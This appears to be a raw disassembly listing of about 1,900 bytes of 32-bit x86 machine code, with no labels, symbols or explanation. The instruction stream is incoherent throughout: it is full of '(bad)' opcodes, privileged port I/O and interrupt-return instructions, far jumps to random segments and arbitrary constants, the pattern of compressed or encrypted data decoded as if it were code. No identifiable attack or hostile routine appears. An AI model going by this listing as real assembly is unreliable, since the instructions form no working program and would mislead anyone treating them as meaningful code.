  41e17f:	in     al,dx
  41e180:	leave  
  41e181:	aaa    
  41e182:	or     al,0x3c
  41e184:	jne    0x41e121
  41e186:	mov    ch,0x6a
  41e188:	cmp    DWORD PTR ds:0xc1dc6eba,0x466f8983
  41e192:	lock push 0xe286781a
  41e198:	sub    al,0x55
  41e19a:	sub    ah,dl
  41e19c:	add    BYTE PTR ss:[ecx],bh
  41e19f:	ss pop es
  41e1a1:	cmc    
  41e1a2:	mov    ebp,0x3319de3a
  41e1a7:	sub    dl,BYTE PTR [edi]
  41e1a9:	loop   0x41e1ac
  41e1ab:	sbb    al,0xbc
  41e1ad:	and    ch,dh
  41e1af:	add    al,0x9b
  41e1b1:	and    dl,BYTE PTR [edx+0x4b]
  41e1b4:	jmp    0x41e1ed
  41e1b6:	add    BYTE PTR [ebx+0x76],dl
  41e1b9:	popf   
  41e1ba:	lods   eax,DWORD PTR ds:[esi]
  41e1bb:	retf   0xa89c
  41e1be:	dec    edx
  41e1bf:	addr16 ja 0x41e19f
  41e1c2:	mov    edi,0x76b4f90b
  41e1c7:	xor    esp,DWORD PTR [edi]
  41e1c9:	push   ebx
  41e1ca:	fiadd  DWORD PTR [esi-0x28]
  41e1cd:	rcr    dh,0x8a
  41e1d0:	push   esp
  41e1d1:	xor    ebx,DWORD PTR [ebp-0x2f0bf60c]
  41e1d7:	je     0x41e231
  41e1d9:	arpl   WORD PTR [edx+edi*2],bp
  41e1dc:	cmp    bh,dl
  41e1de:	and    al,0xd
  41e1e0:	iret   
  41e1e1:	arpl   WORD PTR [ebx+0x10d2254b],bp
  41e1e7:	repz jne 0x41e173
  41e1ea:	mov    al,ds:0xffd116d2
  41e1ef:	push   esi
  41e1f0:	scas   eax,DWORD PTR es:[edi]
  41e1f1:	xlat   BYTE PTR ds:[ebx]
  41e1f2:	lods   eax,DWORD PTR ds:[esi]
  41e1f3:	mov    dh,0x48
  41e1f5:	out    dx,eax
  41e1f6:	cmp    DWORD PTR [esi+0x5dd4b069],ebx
  41e1fc:	and    dl,0x8b
  41e1ff:	mov    dl,0x4f
  41e201:	out    dx,eax
  41e202:	inc    ecx
  41e203:	or     esp,DWORD PTR [esi]
  41e205:	mov    dh,0x4
  41e207:	mov    DWORD PTR [edx+0x29e986ba],eax
  41e20d:	(bad)  
  41e20e:	cmp    ebx,edx
  41e210:	nop
  41e211:	pop    ds
  41e212:	sub    eax,0xd0430dec
  41e217:	lods   al,BYTE PTR ds:[esi]
  41e218:	out    dx,eax
  41e219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e21a:	je     0x41e277
  41e21c:	mov    esp,0xd7c82f73
  41e221:	mov    dh,0x51
  41e223:	xor    ebx,DWORD PTR [edi+ecx*4]
  41e226:	mov    cl,0xe8
  41e228:	test   al,0xb9
  41e22a:	xor    dl,BYTE PTR [eax+0x57236182]
  41e230:	js     0x41e29c
  41e232:	les    ebx,FWORD PTR [eax]
  41e234:	jge    0x41e1f2
  41e236:	std    
  41e237:	test   BYTE PTR [edi+0x64],0x51
  41e23b:	jp     0x41e26a
  41e23d:	xor    eax,0x4870ea4f
  41e242:	push   ecx
  41e243:	pusha  
  41e244:	out    dx,eax
  41e245:	scas   eax,DWORD PTR es:[edi]
  41e246:	stos   BYTE PTR es:[edi],al
  41e247:	mov    al,ds:0xf4683321
  41e24c:	div    BYTE PTR [eax+0x1bfc8166]
  41e252:	das    
  41e253:	ins    DWORD PTR es:[edi],dx
  41e254:	mov    al,ds:0x8215ff3d
  41e259:	nop
  41e25a:	and    eax,0x2cba13b2
  41e25f:	adc    DWORD PTR [ecx+edx*4+0x3f55312a],0xcebece34
  41e26a:	aaa    
  41e26b:	lods   eax,DWORD PTR ds:[esi]
  41e26c:	fiadd  DWORD PTR ds:0xe58f6755
  41e272:	jle    0x41e239
  41e274:	mov    ?,WORD PTR [edx+0x2ff69d73]
  41e27a:	ins    BYTE PTR es:[edi],dx
  41e27b:	(bad)  
  41e27c:	loopne 0x41e237
  41e27e:	lods   al,BYTE PTR ds:[esi]
  41e27f:	fsubr  QWORD PTR [esi-0x14b2b7b9]
  41e285:	adc    al,0x5f
  41e287:	enter  0x481c,0x27
  41e28b:	out    dx,al
  41e28c:	sbb    ebx,esp
  41e28e:	aam    0x78
  41e290:	mov    esi,0xeb9ad17
  41e295:	stc    
  41e296:	adc    esi,esp
  41e298:	fmul   QWORD PTR [esi-0x69]
  41e29b:	aam    0xe0
  41e29d:	and    BYTE PTR [ebx-0x13],al
  41e2a0:	lea    edx,[ecx-0x5d]
  41e2a3:	cmp    al,0xbd
  41e2a6:	mov    dh,0x2f
  41e2a8:	xor    BYTE PTR [ecx-0x25],cl
  41e2ab:	mov    al,0xe5
  41e2ad:	pop    esi
  41e2ae:	push   eax
  41e2af:	push   cs
  41e2b0:	pop    ss
  41e2b1:	aas    
  41e2b2:	xchg   edi,eax
  41e2b3:	jp     0x41e325
  41e2b5:	bound  ebp,QWORD PTR [eax-0x78]
  41e2b8:	mov    dh,BYTE PTR [eax-0x50]
  41e2bb:	gs jp  0x41e2d3
  41e2be:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2c0:	mov    ds:0x369a34d4,al
  41e2c5:	pop    ecx
  41e2c6:	sahf   
  41e2c7:	es adc al,0xaf
  41e2ca:	mov    bh,0x4e
  41e2cc:	sbb    BYTE PTR [ebp-0x3],bh
  41e2cf:	xchg   ebx,eax
  41e2d0:	and    al,0x41
  41e2d2:	mov    bl,0x20
  41e2d4:	mov    DWORD PTR [edx+0x18],esi
  41e2d7:	scas   eax,DWORD PTR es:[edi]
  41e2d8:	cmp    eax,0x96cb74fe
  41e2dd:	jecxz  0x41e26b
  41e2df:	sbb    edi,DWORD PTR [eax]
  41e2e1:	sbb    edi,edi
  41e2e3:	add    eax,0xbc96f234
  41e2e8:	iret   
  41e2e9:	popf   
  41e2ea:	jecxz  0x41e2db
  41e2ec:	test   BYTE PTR [edx+0x2810893],ch
  41e2f2:	sub    eax,0x7873f8b5
  41e2f7:	jbe    0x41e32c
  41e2f9:	inc    ecx
  41e2fa:	bound  edx,QWORD PTR [eax-0x18]
  41e2fd:	js     0x41e2b8
  41e2ff:	sbb    bh,BYTE PTR [edi]
  41e301:	jl     0x41e33e
  41e303:	and    DWORD PTR [eax+0x75],0x3b
  41e307:	push   ds
  41e308:	sub    edi,DWORD PTR [ebx+0x64]
  41e30b:	cmp    DWORD PTR [esi-0x50],esp
  41e30e:	test   al,0x6
  41e310:	xor    dh,BYTE PTR [eax+0x78f8ad6f]
  41e316:	ret    
  41e317:	fwait
  41e318:	(bad)  
  41e319:	addr16 and eax,0xc6c39266
  41e31f:	mov    ebp,0xdf302feb
  41e324:	scas   eax,DWORD PTR es:[edi]
  41e325:	shr    BYTE PTR [esi-0x72],0xa0
  41e329:	sbb    eax,0x9e95221
  41e32e:	pop    ss
  41e32f:	mov    ch,0x3d
  41e331:	pop    eax
  41e332:	dec    edx
  41e333:	pop    ebx
  41e334:	mov    DWORD PTR [edi+0x2ee65f79],esi
  41e33a:	jo     0x41e3ac
  41e33c:	add    DWORD PTR [ebx],ebx
  41e33e:	pusha  
  41e33f:	pop    eax
  41e340:	nop
  41e341:	ja     0x41e356
  41e343:	aas    
  41e344:	shl    BYTE PTR [ecx],cl
  41e346:	fcmovne st,st(4)
  41e348:	xchg   ecx,eax
  41e349:	mov    ds:0x1f674a4b,al
  41e34e:	int3   
  41e34f:	mov    ds:0x8334b1f5,eax
  41e354:	mov    bh,0x6b
  41e356:	mov    ebp,ecx
  41e358:	inc    esi
  41e359:	jno    0xdf9bbe30
  41e35f:	nop    DWORD PTR ds:0x65f8fe5e
  41e366:	cmp    dl,dh
  41e368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e369:	push   0xffffffec
  41e36b:	push   cs
  41e36c:	xchg   BYTE PTR [ebp+0x39],ch
  41e36f:	dec    esp
  41e370:	(bad)  
  41e371:	repz sysret 
  41e374:	mov    eax,0x1481907c
  41e379:	cmc    
  41e37a:	cld    
  41e37b:	daa    
  41e37c:	call   0xa544:0x57d4b0f0
  41e383:	outs   dx,DWORD PTR ds:[esi]
  41e384:	xor    eax,0x3607eb10
  41e389:	cdq    
  41e38a:	arpl   WORD PTR [eax-0xf],dx
  41e38d:	push   eax
  41e38e:	adc    eax,0x859e9bc6
  41e393:	shr    DWORD PTR [edi-0x1b],0x97
  41e397:	and    al,BYTE PTR [edi-0x62]
  41e39a:	xor    al,dh
  41e39c:	mov    BYTE PTR [edi-0x55],bh
  41e39f:	jmp    0x5220:0xde8eb4a5
  41e3a6:	xchg   esi,eax
  41e3a7:	or     esi,DWORD PTR [ebp-0x46]
  41e3aa:	mov    edi,0xdc9d3e56
  41e3af:	inc    edx
  41e3b0:	jp     0x41e425
  41e3b2:	mov    bh,0xef
  41e3b4:	scas   eax,DWORD PTR es:[edi]
  41e3b5:	xor    dh,dh
  41e3b7:	mov    ah,0x15
  41e3b9:	lods   al,BYTE PTR ds:[esi]
  41e3ba:	xor    bl,BYTE PTR [ebp+0x4b104ba]
  41e3c0:	dec    ecx
  41e3c1:	mov    ch,0x90
  41e3c3:	stos   DWORD PTR es:[edi],eax
  41e3c4:	sub    al,0xe
  41e3c6:	neg    DWORD PTR [esi]
  41e3c8:	(bad)
  41e3cc:	jne    0x41e394
  41e3ce:	cld    
  41e3cf:	jle    0x41e3a6
  41e3d1:	mov    eax,0x8cc07779
  41e3d6:	jge    0x41e39b
  41e3d8:	enter  0xdac3,0xd4
  41e3dc:	mov    esi,0xa5c0f3b0
  41e3e1:	loop   0x41e3ff
  41e3e3:	addr16 mov cl,0x1b
  41e3e6:	or     edi,DWORD PTR [edi]
  41e3e8:	dec    edx
  41e3e9:	pop    ss
  41e3ea:	and    esp,DWORD PTR [edi-0x1f2b1ac7]
  41e3f0:	xor    eax,0xd03c5599
  41e3f5:	or     eax,DWORD PTR [eax]
  41e3f7:	fstp   TBYTE PTR [ebx]
  41e3f9:	push   ebp
  41e3fa:	mov    ds:0x1a07582b,al
  41e3ff:	(bad)  
  41e401:	and    al,0xef
  41e403:	jae    0x41e427
  41e405:	shr    BYTE PTR ds:[edx],1
  41e408:	mov    al,ds:0xc98ef9dc
  41e40d:	dec    ebx
  41e40e:	popa   
  41e40f:	aas    
  41e410:	dec    eax
  41e411:	in     al,dx
  41e412:	push   0x1c
  41e414:	dec    ebp
  41e415:	lds    edx,FWORD PTR es:[eax-0x575fdf23]
  41e41c:	(bad)  
  41e41d:	das    
  41e41e:	test   al,dh
  41e420:	bnd jns 0x41e42f
  41e423:	jl     0x41e44d
  41e425:	std    
  41e426:	lods   eax,DWORD PTR ds:[esi]
  41e427:	es dec edi
  41e429:	repnz and BYTE PTR [eax+0x72ad067],cl
  41e430:	xor    al,0x45
  41e432:	cdq    
  41e433:	pop    ss
  41e434:	sti    
  41e435:	and    dl,ah
  41e437:	jb     0x41e425
  41e439:	fdivr  QWORD PTR [edx]
  41e43b:	sbb    WORD PTR [edi-0xa],bp
  41e43f:	pop    esp
  41e440:	pop    es
  41e441:	out    dx,eax
  41e442:	add    eax,0x61de8dc0
  41e447:	and    al,bl
  41e449:	popf   
  41e44a:	mov    DWORD PTR [ebx-0x14],esi
  41e44d:	sti    
  41e44e:	imul   DWORD PTR [ebx+0x6ae603d]
  41e454:	test   BYTE PTR [esi-0x57],0x74
  41e458:	(bad)  
  41e459:	push   0xd7666b1d
  41e45e:	retf   
  41e45f:	jmp    FWORD PTR [eax+0x61c34a42]
  41e465:	(bad)  
  41e466:	ret    0x6089
  41e469:	xor    BYTE PTR [ebx+0x2e10d9a4],dh
  41e46f:	mov    bl,cl
  41e471:	jmp    0xf0a8fb17
  41e476:	sbb    eax,0x8dc5990e
  41e47b:	pop    eax
  41e47c:	pop    ebp
  41e47d:	imul   edx,DWORD PTR [esi],0xcecb5f0
  41e483:	pop    ebx
  41e484:	add    DWORD PTR [ecx],esi
  41e486:	and    dl,BYTE PTR [ecx+0x38]
  41e489:	test   al,0x41
  41e48b:	jg     0x41e44a
  41e48d:	ret    0x6e34
  41e490:	ja     0x41e4ae
  41e492:	pushf  
  41e493:	mov    al,0x49
  41e495:	dec    esp
  41e496:	sahf   
  41e497:	and    ebx,0xbd4cb15d
  41e49d:	enter  0xea8b,0x62
  41e4a1:	enter  0x1ea2,0xe2
  41e4a5:	outs   dx,BYTE PTR ds:[esi]
  41e4a6:	stos   BYTE PTR es:[edi],al
  41e4a7:	aaa    
  41e4a8:	jmp    0x41e4f8
  41e4aa:	mov    al,dl
  41e4ac:	clc    
  41e4ad:	add    BYTE PTR [ecx+0x5f],al
  41e4b0:	clc    
  41e4b1:	pop    eax
  41e4b2:	lock sbb bl,BYTE PTR [edx-0xb33fb99]
  41e4b9:	xchg   esp,eax
  41e4ba:	loopne 0x41e535
  41e4bc:	sbb    eax,0xb27bf2ce
  41e4c1:	and    eax,0x1f5e38dc
  41e4c6:	push   0x1b596455
  41e4cb:	imul   ebx,ebx,0x883e0b1c
  41e4d1:	cmp    esp,DWORD PTR [eax-0x74]
  41e4d4:	das    
  41e4d5:	mov    ebx,0x4afa07aa
  41e4da:	push   ebp
  41e4db:	add    eax,0x11d52194
  41e4e0:	xchg   edx,eax
  41e4e1:	ins    DWORD PTR es:[edi],dx
  41e4e2:	inc    edx
  41e4e3:	add    eax,0x78826cea
  41e4e8:	popf   
  41e4e9:	outs   dx,BYTE PTR ds:[esi]
  41e4ea:	xor    eax,DWORD PTR ds:0xf5951134
  41e4f0:	sbb    bl,BYTE PTR [edx]
  41e4f2:	jns    0x41e563
  41e4f4:	ret    
  41e4f5:	out    dx,al
  41e4f6:	popf   
  41e4f7:	add    bl,ah
  41e4f9:	fistp  WORD PTR [ebx]
  41e4fb:	pop    edx
  41e4fc:	and    ch,BYTE PTR [eax-0x6eee99eb]
  41e502:	loopne 0x41e547
  41e504:	mov    edx,0x813297a9
  41e509:	push   edi
  41e50a:	imul   eax,ebp,0xe97737a4
  41e510:	dec    ebp
  41e511:	jecxz  0x41e4c7
  41e513:	add    DWORD PTR [ebx+0x5c77a049],esp
  41e519:	pop    ecx
  41e51a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e51b:	call   0x4b8b:0x6fd20a17
  41e522:	cmp    eax,0xec2a56c5
  41e527:	push   ebp
  41e528:	inc    edi
  41e529:	mov    ah,0xb4
  41e52b:	sub    ecx,DWORD PTR [ebx]
  41e52d:	push   esp
  41e52e:	in     eax,0x0
  41e530:	dec    edi
  41e531:	imul   BYTE PTR [eax+0x4f]
  41e534:	sub    DWORD PTR [edx-0x17],esp
  41e537:	loop   0x41e53b
  41e539:	adc    DWORD PTR ds:0x99b33a54,esi
  41e53f:	or     eax,0x6c497c59
  41e544:	test   eax,0x75443c3
  41e549:	inc    esp
  41e54a:	push   cs
  41e54b:	xchg   edi,eax
  41e54c:	jmp    0x3e25f82c
  41e551:	test   BYTE PTR [ebp-0x10],dh
  41e554:	ins    BYTE PTR es:[edi],dx
  41e555:	and    al,0x30
  41e557:	or     esp,DWORD PTR [ecx-0x48b39441]
  41e55d:	sub    al,0xe
  41e55f:	sbb    bh,BYTE PTR [esi]
  41e561:	or     al,0xcf
  41e563:	out    0xf,eax
  41e565:	mov    ch,0xcf
  41e567:	adc    al,0x35
  41e569:	lahf   
  41e56a:	fnstenv [ebx+eiz*8]
  41e56d:	add    dl,dh
  41e56f:	mov    edx,esi
  41e571:	ins    DWORD PTR es:[edi],dx
  41e572:	fnstcw WORD PTR [edx+0x6e]
  41e575:	or     bh,ch
  41e577:	addr16 mov ch,0x51
  41e57a:	inc    ebp
  41e57b:	scas   al,BYTE PTR es:[edi]
  41e57c:	inc    ebx
  41e57d:	out    0xc2,al
  41e57f:	inc    ebp
  41e580:	or     al,0x28
  41e582:	cs jno 0x41e53f
  41e585:	out    0x69,al
  41e587:	pusha  
  41e588:	test   eax,0xa6928d89
  41e58d:	fdivp  st(3),st
  41e58f:	xlat   BYTE PTR ds:[ebx]
  41e590:	xchg   esi,eax
  41e591:	push   es
  41e592:	or     DWORD PTR [ecx],eax
  41e594:	mov    eax,ds:0x929abc22
  41e599:	sbb    esp,DWORD PTR [eax-0x70]
  41e59c:	sbb    DWORD PTR [edx+0x1e],ebp
  41e59f:	into   
  41e5a0:	fcmovne st,st(3)
  41e5a2:	adc    eax,0xdd4dd687
  41e5a7:	(bad)  
  41e5a8:	mov    ah,0xe
  41e5aa:	aas    
  41e5ab:	pop    ecx
  41e5ac:	xchg   BYTE PTR [ebp-0x5b],dl
  41e5af:	mul    DWORD PTR [edi+0x37]
  41e5b2:	ror    bl,cl
  41e5b4:	push   edx
  41e5b5:	jmp    0xf7ed:0xa934fcb
  41e5bc:	cdq    
  41e5bd:	mov    dl,0xa5
  41e5bf:	ret    0x684a
  41e5c2:	stos   BYTE PTR es:[edi],al
  41e5c3:	out    dx,al
  41e5c4:	add    DWORD PTR [ecx+0x60e363a0],edi
  41e5ca:	push   eax
  41e5cb:	ret    
  41e5cc:	mov    dh,BYTE PTR [edi]
  41e5ce:	jg     0x41e56b
  41e5d0:	pop    eax
  41e5d1:	push   esp
  41e5d2:	push   DWORD PTR [ebx+0x28]
  41e5d5:	imul   ebp,DWORD PTR [esi+0x61333d52],0x3ad35c5f
  41e5df:	(bad)  
  41e5e1:	jg     0x41e619
  41e5e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5e4:	aad    0x3f
  41e5e6:	dec    ebp
  41e5e7:	rol    bh,1
  41e5e9:	mov    ?,ebp
  41e5eb:	cmp    al,0xdc
  41e5ed:	dec    edx
  41e5ee:	call   0x64fdf546
  41e5f3:	aaa    
  41e5f4:	dec    eax
  41e5f5:	inc    edx
  41e5f6:	adc    al,0x99
  41e5f8:	push   es
  41e5f9:	add    esp,edx
  41e5fb:	inc    esp
  41e5fc:	leave  
  41e5fd:	fnstenv [ecx+0x78df6210]
  41e603:	es call 0xc686:0x4455948
  41e60b:	repnz cmp al,0x2d
  41e60e:	push   0x52
  41e610:	push   ds
  41e611:	jmp    0x41e61c
  41e613:	lods   al,BYTE PTR ds:[esi]
  41e614:	scas   al,BYTE PTR es:[edi]
  41e615:	retf   0xd6e4
  41e618:	pavgb  mm3,mm2
  41e61b:	or     DWORD PTR [eax-0x7d844a7d],ebx
  41e621:	mov    eax,ds:0x8eebd5ec
  41e626:	and    al,0x51
  41e628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e629:	sti    
  41e62a:	push   ss
  41e62b:	mov    es,WORD PTR [esi]
  41e62d:	push   edi
  41e62e:	pop    ebx
  41e62f:	mov    esi,edi
  41e631:	outs   dx,BYTE PTR ds:[esi]
  41e632:	push   0x4b75cd5
  41e637:	jle    0x41e60d
  41e639:	add    ah,BYTE PTR [ebp-0x42]
  41e63c:	ret    0x5605
  41e63f:	jb     0x41e6b1
  41e641:	shl    BYTE PTR [edi],cl
  41e643:	dec    ecx
  41e644:	xchg   ebx,eax
  41e645:	cmp    esp,DWORD PTR [edx+0x35]
  41e648:	pop    edx
  41e649:	or     bh,BYTE PTR [eax+0x74b9911c]
  41e64f:	or     al,0xe9
  41e651:	in     eax,0xea
  41e653:	aas    
  41e654:	sub    eax,0xf7445a60
  41e659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e65a:	mov    al,ds:0xd90a82e9
  41e65f:	jl     0x41e62a
  41e661:	sub    BYTE PTR ds:0x96f6ebf2,al
  41e667:	cwde   
  41e668:	sbb    eax,0xcea4bd6a
  41e66d:	mov    eax,0xd3edae44
  41e672:	lods   al,BYTE PTR ds:[esi]
  41e673:	ja     0x41e60c
  41e675:	js     0x41e681
  41e677:	outs   dx,DWORD PTR ds:[esi]
  41e678:	sahf   
  41e679:	fnstsw WORD PTR cs:[ecx+0x490d412c]
  41e680:	pop    esp
  41e681:	mov    ecx,0x69ed712d
  41e686:	or     eax,DWORD PTR [eax]
  41e688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e689:	sub    esi,0x48
  41e68c:	(bad)  
  41e68d:	mov    ecx,0xcdd4ac6b
  41e692:	adc    al,0x32
  41e694:	xchg   ecx,eax
  41e695:	cmp    bl,ch
  41e697:	pusha  
  41e698:	ret    0xdb55
  41e69b:	scas   eax,DWORD PTR es:[edi]
  41e69c:	sbb    al,0xee
  41e69e:	lahf   
  41e69f:	jo     0x41e632
  41e6a1:	aam    0x22
  41e6a3:	dec    esp
  41e6a4:	sub    eax,ebp
  41e6a6:	pop    edi
  41e6a7:	jns    0x41e68d
  41e6a9:	sub    BYTE PTR ds:0xca7d1806,ch
  41e6af:	cdq    
  41e6b0:	pusha  
  41e6b1:	sti    
  41e6b2:	inc    esi
  41e6b3:	cmc    
  41e6b4:	pop    ecx
  41e6b5:	stc    
  41e6b6:	lods   al,BYTE PTR ds:[esi]
  41e6b7:	jb     0x41e67e
  41e6b9:	sahf   
  41e6ba:	ins    DWORD PTR es:[edi],dx
  41e6bb:	xchg   ecx,eax
  41e6bc:	aaa    
  41e6bd:	gs jno 0x41e646
  41e6c0:	and    BYTE PTR [ebp-0x51],bl
  41e6c3:	xchg   edi,eax
  41e6c4:	pop    edi
  41e6c5:	lahf   
  41e6c6:	(bad)  
  41e6c7:	push   0x6bd1d512
  41e6cc:	jg     0x41e6eb
  41e6ce:	inc    esp
  41e6cf:	jo     0x41e726
  41e6d1:	mov    ah,0x88
  41e6d3:	cmp    eax,0x68bbfca4
  41e6d8:	cmp    dh,ah
  41e6da:	pop    eax
  41e6db:	fisubr DWORD PTR [eax-0x21]
  41e6de:	test   DWORD PTR [esi+ebx*4-0x3a],0x51948a88
  41e6e6:	jmp    0x41e761
  41e6e8:	lahf   
  41e6e9:	aad    0x5f
  41e6eb:	js     0x41e6ec
  41e6ed:	jno    0x41e689
  41e6ef:	and    eax,0x694f9ca5
  41e6f4:	cmp    esp,DWORD PTR [esi+0x7a]
  41e6f7:	loopne 0x41e6b1
  41e6f9:	pop    ecx
  41e6fa:	in     al,0xf9
  41e6fc:	xor    eax,eax
  41e6fe:	rol    DWORD PTR [ebx],1
  41e700:	call   0xc2bc:0x19ce4cba
  41e707:	jp     0x41e760
  41e709:	enter  0xac71,0xff
  41e70d:	fnstcw WORD PTR [eax+0x1239a570]
  41e713:	jns    0x41e6a6
  41e715:	outs   dx,BYTE PTR ds:[esi]
  41e716:	cli    
  41e717:	sbb    eax,0x2c531e65
  41e71c:	pop    edi
  41e71d:	ins    DWORD PTR es:[edi],dx
  41e71e:	out    0x2,al
  41e720:	mov    ebx,ecx
  41e722:	xchg   DWORD PTR [edx+0x4e],ecx
  41e725:	sbb    esp,DWORD PTR [esi]
  41e727:	mov    bh,0xa3
  41e729:	(bad)  
  41e72a:	xchg   esp,eax
  41e72b:	repnz push cs
  41e72d:	push   0xffffffc5
  41e72f:	and    al,al
  41e731:	or     al,0x48
  41e733:	xchg   esi,eax
  41e734:	dec    edi
  41e735:	retf   0xd531
  41e738:	pop    esi
  41e739:	shl    BYTE PTR [ebx-0x5c],1
  41e73c:	xor    dh,BYTE PTR [ebp+0x76]
  41e73f:	push   0x3f
  41e741:	sbb    BYTE PTR [ebx-0x4a7d87db],ah
  41e747:	gs add ebx,esp
  41e74a:	(bad)  
  41e74b:	and    al,BYTE PTR [edx]
  41e74d:	push   es
  41e74e:	lds    edx,FWORD PTR [ebx]
  41e750:	jb     0x41e76f
  41e752:	aas    
  41e753:	add    eax,0x6228fc74
  41e758:	inc    edi
  41e759:	pop    esi
  41e75a:	xor    BYTE PTR [edx],dl
  41e75c:	and    cl,BYTE PTR [ebx]
  41e75e:	(bad)  
  41e75f:	jg     0x41e7d8
  41e761:	icebp  
  41e762:	stc    
  41e763:	mov    al,ds:0xb6ffd36c
  41e768:	shr    DWORD PTR [edi],cl
  41e76a:	mov    esi,DWORD PTR [eax-0x22]
  41e76d:	stos   BYTE PTR es:[edi],al
  41e76e:	jae    0x41e7ad
  41e770:	sub    DWORD PTR [edi+eax*2+0xd],edx
  41e774:	add    DWORD PTR [esp+edi*2+0x4c645905],esp
  41e77b:	mov    eax,DWORD PTR [eax-0x7134f630]
  41e781:	inc    esi
  41e782:	mov    ebp,0xc9ca7384
  41e787:	mov    ch,0x55
  41e789:	pop    edx
  41e78a:	or     eax,DWORD PTR [ebx+0x2f08f2ec]
  41e790:	stos   BYTE PTR es:[edi],al
  41e791:	cmp    esi,edx
  41e793:	pop    ds
  41e794:	sahf   
  41e795:	das    
  41e796:	sbb    esi,DWORD PTR [ebx+0x14]
  41e799:	xchg   edx,eax
  41e79a:	or     DWORD PTR [esi-0x2633d0c2],ecx
  41e7a0:	push   edi
  41e7a1:	xor    DWORD PTR [esi],eax
  41e7a3:	(bad)  
  41e7a4:	push   0xffffffc0
  41e7a6:	xor    ebx,0x45ecf5cc
  41e7ac:	xor    edi,DWORD PTR [edx]
  41e7ae:	mov    esi,0x269eef0a
  41e7b3:	or     bh,0x5
  41e7b6:	inc    ecx
  41e7b7:	leave  
  41e7b8:	mov    ch,0x13
  41e7ba:	inc    eax
  41e7bb:	jnp    0x41e80b
  41e7bd:	jge    0x41e83e
  41e7bf:	loop   0x41e81a
  41e7c1:	xchg   ecx,eax
  41e7c2:	test   al,0xb6
  41e7c4:	xchg   esp,eax
  41e7c5:	outs   dx,DWORD PTR ds:[esi]
  41e7c6:	pop    ss
  41e7c7:	mov    bh,0x2c
  41e7c9:	xchg   esi,eax
  41e7ca:	outs   dx,BYTE PTR fs:[esi]
  41e7cc:	arpl   cx,cx
  41e7ce:	and    bh,cl
  41e7d0:	mov    dh,0x0
  41e7d2:	mov    bl,0x39
  41e7d4:	imul   esi,DWORD PTR [ebx],0xfd1ba84f
  41e7da:	mov    DWORD PTR [edi+eiz*8-0x2b],0x85376017
  41e7e2:	adc    DWORD PTR [ebx],ecx
  41e7e4:	(bad)  
  41e7e6:	int    0x6e
  41e7e8:	fisttp WORD PTR [esi-0x19]
  41e7eb:	js     0x41e7e5
  41e7ed:	enter  0xad0d,0x33
  41e7f1:	bound  ebp,QWORD PTR [ecx]
  41e7f3:	adc    edi,DWORD PTR [eax-0x6a61e820]
  41e7f9:	popa   
  41e7fa:	lahf   
  41e7fb:	gs sub al,ah
  41e7fe:	pop    ebp
  41e7ff:	aad    0xe1
  41e801:	dec    esi
  41e802:	xchg   edi,eax
  41e803:	stos   BYTE PTR es:[edi],al
  41e804:	add    al,0xf2
  41e806:	js     0x41e7fd
  41e808:	adc    ah,BYTE PTR cs:[edi]
  41e80b:	jnp    0x41e7bc
  41e80d:	sar    BYTE PTR [ebx+edi*4-0x3b5693e7],cl
  41e814:	and    DWORD PTR [edi],ebx
  41e816:	jbe    0x41e7c7
  41e818:	imul   esp,DWORD PTR [ebp+0x56d07f4],0xffffffc2
  41e81f:	xchg   ebp,eax
  41e820:	dec    edx
  41e821:	fcomp  DWORD PTR [esp+edi*1+0x22621ee]
  41e828:	xchg   DWORD PTR [ebx+0x51ecc630],edx
  41e82e:	mov    edi,0xd2ee6659
  41e833:	mov    ch,0x45
  41e835:	(bad)  
  41e836:	sub    al,0x6d
  41e838:	pop    eax
  41e839:	cmp    DWORD PTR [esi],edi
  41e83b:	popf   
  41e83c:	(bad)  
  41e83d:	mov    al,0xe6
  41e83f:	aam    0xac
  41e841:	xchg   esi,eax
  41e842:	sbb    eax,esp
  41e844:	add    bl,dl
  41e846:	fbld   TBYTE PTR [ecx-0x14]
  41e849:	sbb    edx,eax
  41e84b:	jnp    0x41e827
  41e84d:	(bad)  
  41e84e:	xchg   edx,eax
  41e84f:	dec    esp
  41e850:	pop    ecx
  41e851:	int    0xd8
  41e853:	test   eax,0x9170b7db
  41e858:	iret   
  41e859:	or     dl,BYTE PTR [di-0x1b]
  41e85d:	cli    
  41e85e:	dec    eax
  41e85f:	aas    
  41e860:	sub    ebp,edi
  41e862:	out    dx,al
  41e863:	pop    eax
  41e864:	mov    eax,0x687770
  41e869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e86a:	fst    QWORD PTR [edi]
  41e86c:	add    al,0xdc
  41e86e:	xor    al,0xaa
  41e870:	jae    0x41e828
  41e872:	xor    ecx,esi
  41e874:	mov    ecx,0xd6adb505
  41e879:	retf   0xe5c4
  41e87c:	fnstsw WORD PTR [esi+eiz*2-0x3523ae73]
  41e883:	mov    gs,WORD PTR [ecx+edx*4-0x7a]
  41e887:	and    bh,BYTE PTR [ebx]
  41e889:	call   0xee1a:0x5e83f656
  41e890:	arpl   WORD PTR [eax-0x65],sp
  41e893:	push   ds
  41e894:	fld    QWORD PTR [eax-0x1c]
  41e897:	inc    edx
  41e898:	test   esp,0xc33d2e60
  41e89e:	jecxz  0x41e8ee
  41e8a0:	imul   eax,DWORD PTR [ebx+0x40e3c4d6],0x31
  41e8a7:	inc    ebp
  41e8a8:	int3   
  41e8a9:	scas   al,BYTE PTR es:[edi]
  41e8aa:	std    
  41e8ab:	int    0x63
  41e8ad:	out    dx,eax
  41e8ae:	int    0x1f
  41e8b0:	cs out 0xb6,al
  41e8b3:	popf   
  41e8b4:	mov    cl,0xef
  41e8b6:	in     eax,0x1
  41e8b8:	(bad)  
  41e8b9:	iret   
  41e8ba:	in     al,dx
  41e8bb:	push   0x682609a6
  41e8c0:	jg     0x41e900
  41e8c2:	pop    ebx
  41e8c3:	ror    DWORD PTR [ecx],0xdb
  41e8c6:	shl    DWORD PTR [ecx-0x44],1
  41e8c9:	push   0x171809a6
  41e8ce:	or     DWORD PTR [ecx+edi*8-0x5f],edi
  41e8d2:	(bad)  
  41e8d4:	retf   
  41e8d5:	pop    esp
  41e8d6:	adc    eax,0xa03a6a99
